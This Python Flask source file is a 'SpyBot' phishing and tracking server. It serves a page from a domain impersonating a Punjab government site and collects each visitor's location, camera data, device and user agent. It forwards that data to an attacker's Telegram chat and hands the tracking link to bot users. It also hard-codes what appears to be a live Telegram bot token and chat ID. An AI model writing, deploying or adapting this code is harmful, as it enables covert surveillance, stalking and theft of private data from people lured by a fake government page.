from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# Telegram credentials
OT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'

# Your phishing or tracking page link
LINK = 'https://govt-of-punjab-pak.onrender.com'

@app.route('/')
def index():
    return render_template('spy.html')

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()
        message = f"""🕵️‍♂️ *SpyBot Alert*
📍 *Location:* {data.get('latitude', '❌ Unknown')}, {data.get('longitude', '❌')}
📷 *Camera:* {data.get('camera')}
🧠 *Device:* {data.get('device')}
🌐 *UserAgent:* `{data.get('userAgent')}`"""
        requests.post(f'https://api.telegram.org/bot{OT_TOKEN}/sendMessage', data={
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        })
    except Exception as e:
        print(f"[ERROR] {e}")
    return "✅ Info Received"

# Telegram bot webhook (responds to /start)
@app.route(f'/bot-{OT_TOKEN.split(":")[0]}', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'message' in data:
        msg = data['message']
        if msg.get('text') == '/start':
            reply = f"""👋 *Welcome to Faizan™ SpyBot*
📡 System is active. Your tracking link:https://govt-of-punjab-pak.onrender.com

🔗 {LINK}
"""
            requests.post(f'https://api.telegram.org/bot{OT_TOKEN}/sendMessage', data={
                'chat_id': msg['chat']['id'],
                'text': reply,
                'parse_mode': 'Markdown'
            })
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
